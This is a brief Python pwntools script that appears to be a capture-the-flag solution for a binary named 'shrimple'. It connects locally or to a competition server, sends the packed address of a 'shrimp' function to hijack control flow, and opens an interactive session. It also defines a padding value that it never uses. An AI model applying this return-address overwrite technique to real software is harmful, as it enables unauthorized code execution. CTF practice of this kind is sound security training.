from pwn import *
from pwn import p64

elf = ELF('./shrimple')
libc = elf.libc

if args.REMOTE: 
    r = remote('chal.competitivecyber.club', 8844)
else:
    r = process(elf.path)

padding = 30+8

shrimp_addr = p64(elf.sym['shrimp']+5)
print(shrimp_addr)
r.sendline(b'A')
r.sendline(b'A')
r.sendline(shrimp_addr)
r.interactive()